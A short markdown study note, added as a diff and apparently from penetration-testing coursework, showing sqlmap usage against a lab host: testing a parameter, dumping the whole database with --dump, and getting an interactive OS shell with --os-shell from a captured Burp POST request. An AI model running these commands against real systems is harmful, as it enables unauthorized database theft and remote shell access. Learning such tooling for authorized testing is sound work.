@@ -1,0 +1,35 @@
+# Attacks
+- sqlmap
+	- [NO STEALTH]
+	- Example:
+		- sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+			- -u for URL
+			- -p for parameter 
+		- Dump entire database with --dump
+			- sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+		- --os-shell
+			- interactive shell
+			- not ideal with time-based
+			-  Intercept POST request via Burp & save it to local txt file.
+				- ```
+```POST /search.php HTTP/1.1
+Host: 192.168.50.19
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Origin: http://192.168.50.19
+Connection: close
+Referer: http://192.168.50.19/search.php
+Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
+Upgrade-Insecure-Requests: 1
+
+item=test
+```
+- sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+	- -r to use file as post message
+	- -p item for parameter
+	- --os-shell for shell
+	- --web-root for ???
